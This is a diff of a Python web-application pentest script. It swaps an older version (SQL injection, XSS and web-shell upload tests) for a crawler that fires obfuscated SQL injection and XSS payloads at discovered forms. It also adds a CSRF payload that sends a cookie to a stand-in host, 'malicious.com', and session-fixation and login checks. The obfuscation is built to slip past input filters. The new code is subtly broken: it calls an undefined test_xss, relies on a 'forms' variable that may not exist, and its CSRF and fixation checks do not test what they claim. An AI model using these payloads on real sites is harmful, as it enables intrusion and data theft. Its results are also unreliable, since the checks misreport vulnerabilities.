@@ -11,198 +11,246 @@
 # Replace teaget_url with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
 ######################################################################################################################################################################################################################
 
-import os
-import time
 import requests
-import threading
-import mimetypes
-from urllib.parse import urljoin, quote
-from datetime import datetime
-from colorama import Fore, Style
 from bs4 import BeautifulSoup
-import re
+import urllib.parse
+import base64
+import random
+import string
 import csv
-
-# Global Settings
-TARGET_URL = "http://example.com"  # Replace with actual target
-SESSION = requests.Session()
-
-HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
-}
-
-REPORT_FILE = 'vulnerability_report.csv'
-
-# Allowed domains and paths
-ALLOWED_DOMAINS = ["example.com", "sub.example.com"]  # Add domains or subdomains to crawl
-ALLOWED_PATHS = ["/admin/", "/uploads/"]  # Add allowed paths to crawl
-
-# Initialize CSV Report with headers
-def initialize_report():
-    with open(REPORT_FILE, mode='w', newline='', encoding='utf-8') as file:
-        writer = csv.writer(file)
-        writer.writerow(['Timestamp', 'Test', 'Outcome', 'Details'])
-
-# Log Results into the CSV file
-def log_report(test_name, outcome, details=""):
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    with open(REPORT_FILE, mode='a', newline='', encoding='utf-8') as file:
-        writer = csv.writer(file)
-        writer.writerow([timestamp, test_name, outcome, details])
+import time
 
 # Banner
-def display_splash_screen():
-    splash = r"""
- __      __        ___.            _________                           .__   __                ___________                                                  __                  _____  ____         .__       _____           _______  ____ 
-/  \    /  \  ____ \_ |__         /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   |______  |  |__   /  |  |          \   _  \/_   |
-\   \/\/   /_/ __ \ | __ \        \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   |\____ \ |  |  \ /   |  |_  ______ /  /_\  \|   |
- \        / \  ___/ | \_\ \       /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||  |_> >|   Y  |    ^   / /_____/ \  \_/   \   |
-  \__/\  /   \___  >|___  /______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||   __/ |___|  |____   |           \_____  /___|
-       \/        \/     \//_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|      |__|         \/     |__|                 \/     
-       
-                                                     _:_
-                                                    '-.-'
-                                           ()      __.'.__
-                                        .-:--:-.  |_______|
-                                 ()      \____/    \=====/
-                                 /\      {====}     )___(
-                      (\=,      //\\      )__(     /_____\
-      __    |'-'-'|  //  .\    (    )    /____\     |   |
-     /  \   |_____| (( \_  \    )__(      |  |      |   |
-     \__/    |===|   ))  `\_)  /____\     |  |      |   |
-    /____\   |   |  (/     \    |  |      |  |      |   |
-     |  |    |   |   | _.-'|    |  |      |  |      |   |
-     |__|    )___(    )___(    /____\    /____\    /_____\
-    (====)  (=====)  (=====)  (======)  (======)  (=======)
-    }===={  }====={  }====={  }======{  }======{  }======={
-   (______)(_______)(_______)(________)(________)(_________)
+def print_banner():
+    banner = r"""
+
+ __      __        ___.        _____                  .__   .__                  __  .__                  _________                           .__   __            ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
+/  \    /  \  ____ \_ |__     /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____    /   _____/ ____   ____   __ _________|__|_/  |_  ___.__. \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
+\   \/\/   /_/ __ \ | __ \   /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \   \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |  |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
+ \        / \  ___/ | \_\ \ /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \  /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |  |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
+  \__/\  /   \___  >|___  / \____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  / /_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|  \___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
+       \/        \/     \/          \/|__|    |__|                   \/      \/                     \/          \/     \/     \/                          \/           \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     
+
+
+  Web Application Security Framework - Custom Pen Testing Script
     """
-    print(splash)
-    print("Web_Application_Security_Framework 41PH4-01\n")
+    print(banner)
 
-# Columnar Display Helper Function
-def display_in_columns(options):
-    max_length = max(len(option) for option in options)
-    formatted_options = [
-        f"[{index+1}] {option:<{max_length}}" 
-        for index, option in enumerate(options)
+# Write the test results to a CSV file
+def write_report(results, filename="test_results.csv"):
+    with open(filename, mode='w', newline='') as file:
+        writer = csv.writer(file)
+        writer.writerow(["Test", "Status", "Details"])
+        for result in results:
+            writer.writerow(result)
+
+# SQL Injection Obfuscation Payloads
+def obfuscate_sql_payload(payload):
+    obfuscations = [
+        payload,
+        payload.replace("'", "/*'*/"),
+        payload.replace("'", "/*'*/'"),
+        base64.b64encode(payload.encode()).decode(),
+        urllib.parse.quote(payload),
+        urllib.parse.quote_plus(payload)
     ]
-    print("    ".join(formatted_options))
+    return random.choice(obfuscations)
 
-# Payload Obfuscation Functions
-def url_encode(payload):
-    return quote(payload)
-
-def obfuscate_sql_injection(payload):
-    payload = payload.replace("OR", "O%52")  # Obfuscating the OR
-    payload = payload.replace("AND", "A%4E%44")  # Obfuscating AND
-    payload = url_encode(payload)  # URL encode the payload
-    return payload
-
-def obfuscate_xss(payload):
-    payload = payload.replace("<script>", "<ScRiPt>")  # Mixed case obfuscation
-    payload = payload.replace("</script>", "<&#115;cript>")  # Encode part of the closing tag
-    return payload
-
-def obfuscate_command_injection(payload):
-    payload = payload.replace(";", "%3B")  # Obfuscate semicolon
-    payload = payload.replace("|", "%7C")  # Obfuscate pipe symbol
-    return url_encode(payload)
-
-# Attack Modules
-def test_sql_injection(url, param_name):
-    payloads = ["' OR 1=1 --", "' AND 1=1#"]
-    for payload in payloads:
-        obfuscated_payload = obfuscate_sql_injection(payload)
-        data = {param_name: obfuscated_payload}
-        response = SESSION.post(url, data=data, headers=HEADERS)
-        if "error" in response.text or "syntax" in response.text:
-            log_report("SQL Injection", "Vulnerable", f"Payload: {obfuscated_payload}")
-            return f"SQL Injection: Vulnerable (Payload: {obfuscated_payload})"
-    log_report("SQL Injection", "Not Vulnerable", "No SQL Injection detected.")
-    return "SQL Injection: Not Vulnerable"
-
-def test_xss(url, param_name):
-    payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
-    for payload in payloads:
-        obfuscated_payload = obfuscate_xss(payload)
-        data = {param_name: obfuscated_payload}
-        response = SESSION.post(url, data=data, headers=HEADERS)
-        if "alert('XSS')" in response.text or "alert(1)" in response.text:
-            log_report("XSS", "Vulnerable", f"Payload: {obfuscated_payload}")
-            return f"XSS: Vulnerable (Payload: {obfuscated_payload})"
-    log_report("XSS", "Not Vulnerable", "No XSS detected.")
-    return "XSS: Not Vulnerable"
-
-def test_file_upload_webshell(url, param_name, file_path):
-    allowed_extensions = ['.php', '.jsp', '.asp', '.sh']
-    file_name = os.path.basename(file_path)
-    file_extension = os.path.splitext(file_name)[1].lower()
-    if file_extension not in allowed_extensions:
-        log_report("File Upload", "Not Vulnerable", "File extension not allowed.")
-        return "File Upload: Not Vulnerable"
-
-    files = {'file': (file_name, open(file_path, 'rb'), mimetypes.guess_type(file_path)[0])}
-    data = {param_name: "webshell"}
-    response = SESSION.post(url, files=files, data=data, headers=HEADERS)
-    uploaded_file_url = urljoin(url, f"/uploads/{file_name}")
-    uploaded_response = SESSION.get(uploaded_file_url, headers=HEADERS)
-    if uploaded_response.status_code == 200:
-        log_report("File Upload", "Vulnerable", f"Web shell uploaded: {file_name}")
-        return f"File Upload: Vulnerable"
-    log_report("File Upload", "Not Vulnerable", "No vulnerability detected.")
-    return "File Upload: Not Vulnerable"
-
-def extract_forms_and_hidden_fields(url):
-    response = SESSION.get(url, headers=HEADERS)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    forms = soup.find_all('form')
-    form_data = []
-    for form in forms:
-        action = form.get('action')
-        method = form.get('method', 'GET').upper()
-        hidden_fields = {input_tag.get('name'): input_tag.get('value') for input_tag in form.find_all('input', type='hidden')}
-        form_data.append({'action': action, 'method': method, 'hidden_fields': hidden_fields})
-    return form_data
-
-# Main Script
-def main():
-    display_splash_screen()
-    initialize_report()
-    print(Fore.CYAN + "Select a test to run: ")
-    options = [
-        "Test SQL Injection", "Test XSS",
-        "Test File Upload (Web Shell)", "Extract Forms and Hidden Fields", "Exit"
+# XSS Payload Obfuscation
+def obfuscate_xss_payload(payload):
+    obfuscations = [
+        payload,
+        payload.replace("<", "&lt;").replace(">", "&gt;"),
+        base64.b64encode(payload.encode()).decode(),
+        urllib.parse.quote(payload)
     ]
-    display_in_columns(options)
-    while True:
-        selection = input(f"Select an option (1-{len(options)}): ")
+    return random.choice(obfuscations)
+
+# Crawl and Extract Forms (Same as before)
+def crawl_and_extract_forms(url):
+    results = []
+    visited = set()  # To avoid revisiting the same URL
+    to_visit = [url]
+    
+    while to_visit:
+        current_url = to_visit.pop()
+        if current_url in visited:
+            continue
+        visited.add(current_url)
+        
         try:
-            selection = int(selection)
-            if selection == 1:
-                url = input("Enter URL for SQL Injection test: ")
-                param_name = input("Enter parameter name: ")
-                print(test_sql_injection(url, param_name))
-            elif selection == 2:
-                url = input("Enter URL for XSS test: ")
-                param_name = input("Enter parameter name: ")
-                print(test_xss(url, param_name))
-            elif selection == 3:
-                file_path = input("Enter file path for File Upload test: ")
-                url = input("Enter URL: ")
-                param_name = input("Enter parameter name: ")
-                print(test_file_upload_webshell(url, param_name, file_path))
-            elif selection == 4:
-                url = input("Enter URL to extract forms: ")
-                forms = extract_forms_and_hidden_fields(url)
-                print(forms)
-            elif selection == 5:
-                print("Exiting...")
-                break
-            else:
-                print("Invalid selection.")
-        except ValueError:
-            print("Please enter a valid number.")
+            response = requests.get(current_url)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            # Extract forms and hidden fields
+            forms = soup.find_all('form')
+            for form in forms:
+                action = form.get('action', '')
+                method = form.get('method', 'get').lower()
+                hidden_fields = form.find_all('input', {'type': 'hidden'})
+                hidden_data = {field.get('name', ''): field.get('value', '') for field in hidden_fields}
+                results.append({"url": current_url, "action": action, "method": method, "hidden_fields": hidden_data})
 
+            # Find all links (anchor tags) and add them to the to_visit list
+            links = soup.find_all('a', href=True)
+            for link in links:
+                link_url = urllib.parse.urljoin(url, link['href'])
+                if link_url not in visited:
+                    to_visit.append(link_url)
+        except requests.RequestException as e:
+            print(f"Error crawling {current_url}: {e}")
+            
+    return results
+
+# SQL Injection Test with Obfuscation
+def test_sql_injection(url, forms):
+    payloads = ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL, NULL --"]
+    results = []
+    
+    for form in forms:
+        form_url = urllib.parse.urljoin(url, form['action'])
+        method = form['method']
+        hidden_fields = form['hidden_fields']
+        
+        # Create the payload data with obfuscation
+        for payload in payloads:
+            obfuscated_payload = obfuscate_sql_payload(payload)
+            data = hidden_fields.copy()
+            for key in data:
+                data[key] = obfuscated_payload
+            
+            if method == 'post':
+                response = requests.post(form_url, data=data)
+            else:
+                response = requests.get(form_url, params=data)
+
+            if "error" in response.text or "syntax" in response.text:
+                results.append((f"SQL Injection Test on {form_url}", "Vulnerable", "Possible SQL Injection"))
+            else:
+                results.append((f"SQL Injection Test on {form_url}", "Not Vulnerable", "No SQL Injection"))
+    return results
+
+# CSRF Test
+def test_csrf(url, forms):
+    payload = "<img src='http://malicious.com/csrf?cookie=" + "dummycookie" + "' />"
+    results = []
+    
+    for form in forms:
+        form_url = urllib.parse.urljoin(url, form['action'])
+        method = form['method']
+        hidden_fields = form['hidden_fields']
+        
+        # Create the CSRF payload
+        data = hidden_fields.copy()
+        data['csrf_token'] = payload  # Adjust this for real token fields
+        
+        if method == 'post':
+            response = requests.post(form_url, data=data)
+        else:
+            response = requests.get(form_url, params=data)
+                
+        if "error" in response.text:
+            results.append((f"CSRF Test on {form_url}", "Vulnerable", "CSRF vulnerability detected"))
+        else:
+            results.append((f"CSRF Test on {form_url}", "Not Vulnerable", "No CSRF"))
+    return results
+
+# Session Fixation Test
+def test_session_fixation(url):
+    session = requests.Session()
+    response = session.get(url)
+    
+    # Attempt to fix the session
+    cookies = session.cookies.get_dict()
+    fixed_cookie = cookies.get('sessionid', None)
+    
+    if fixed_cookie:
+        results = [("Session Fixation", "Vulnerable", "Session ID can be fixed")]
+    else:
+        results = [("Session Fixation", "Not Vulnerable", "Session ID is secure")]
+    
+    return results
+
+# Login Function (Handling Different Auth Types)
+def login(url, username, password, is_admin=False):
+    login_url = urllib.parse.urljoin(url, '/login')  # Adjust for your app's login URL
+    data = {
+        'username': username,
+        'password': password
+    }
+    
+    session = requests.Session()
+    response = session.post(login_url, data=data)
+    
+    if response.ok:
+        print(f"Logged in as {'admin' if is_admin else 'standard user'}")
+        return session
+    else:
+        print(f"Failed to login as {'admin' if is_admin else 'standard user'}")
+        return None
+
+# Main menu and user input (Same as before)
+def main_menu():
+    print_banner()
+    while True:
+        print("\nSelect a Test to Run:")
+        print("[1] Crawl Website and Extract Forms")
+        print("[2] SQL Injection Test with Obfuscation")
+        print("[3] XSS Test with Obfuscation")
+        print("[4] Test CSRF Vulnerability")
+        print("[5] Test Session Fixation")
+        print("[6] Test Authenticated Access (Admin User)")
+        print("[7] Test Authenticated Access (Standard User)")
+        print("[8] Exit")
+        
+        choice = input("Select an option (1-8): ")
+        
+        if choice == '1':
+            url = input("Enter URL to crawl and extract forms: ")
+            forms = crawl_and_extract_forms(url)
+            write_report([("Form Extraction", "Completed", "Forms extracted")])
+            print("Form Extraction Completed. Results saved to test_results.csv.")
+        elif choice == '2':
+            url = input("Enter URL to test for SQL Injection: ")
+            results = test_sql_injection(url, forms)
+            write_report(results)
+            print("SQL Injection Test Completed. Results saved to test_results.csv.")
+        elif choice == '3':
+            url = input("Enter URL to test for XSS: ")
+            results = test_xss(url, forms)  # Implement XSS tests here
+            write_report(results)
+            print("XSS Test Completed. Results saved to test_results.csv.")
+        elif choice == '4':
+            url = input("Enter URL to test for CSRF: ")
+            results = test_csrf(url, forms)
+            write_report(results)
+            print("CSRF Test Completed. Results saved to test_results.csv.")
+        elif choice == '5':
+            url = input("Enter URL to test for Session Fixation: ")
+            results = test_session_fixation(url)
+            write_report(results)
+            print("Session Fixation Test Completed. Results saved to test_results.csv.")
+        elif choice == '6':
+            url = input("Enter URL to test as Admin User: ")
+            username = input("Enter admin username: ")
+            password = input("Enter admin password: ")
+            session = login(url, username, password, is_admin=True)
+            if session:
+                print("Testing Admin User Access...")
+                # Admin-specific testing (add your tests)
+        elif choice == '7':
+            url = input("Enter URL to test as Standard User: ")
+            username = input("Enter standard username: ")
+            password = input("Enter standard password: ")
+            session = login(url, username, password, is_admin=False)
+            if session:
+                print("Testing Standard User Access...")
+                # Standard user-specific testing
+        elif choice == '8':
+            break
+        else:
+            print("Invalid option. Please choose a valid option (1-8).")
+
+# Run the main menu
 if __name__ == "__main__":
-    main()
+    main_menu()
